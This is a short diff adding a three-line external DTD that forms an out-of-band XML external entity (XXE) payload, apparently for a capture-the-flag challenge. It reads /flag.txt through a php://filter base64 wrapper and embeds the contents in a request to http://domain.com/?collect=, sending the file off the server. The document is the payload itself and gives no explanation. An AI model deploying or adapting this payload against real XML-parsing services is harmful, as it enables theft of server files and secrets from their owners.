@@ -1,0 +1,3 @@
+<!ENTITY % flag SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
+<!ENTITY % int "<!ENTITY send SYSTEM 'http://domain.com/?collect=%flag;'>">
+%int;
